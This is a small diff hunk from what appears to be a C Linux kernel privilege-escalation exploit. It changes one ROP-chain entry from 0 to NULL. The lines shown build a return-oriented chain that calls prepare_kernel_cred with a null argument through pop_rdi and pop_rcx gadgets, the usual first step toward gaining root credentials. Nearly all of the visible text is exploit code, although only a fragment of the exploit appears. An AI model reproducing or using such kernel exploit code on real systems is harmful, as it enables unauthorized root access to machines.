@@ -50,7 +50,7 @@ int main(void)
 
 	rop_chain = (void **)&data[0x408];
 	*rop_chain++ = pop_rdi_xor_al_0_ret;
-	*rop_chain++ = 0;
+	*rop_chain++ = NULL;
 	*rop_chain++ = prepare_kernel_cred;
 	*rop_chain++ = pop_rcx_xor_al_0_ret;
 	*rop_chain++ = 0;
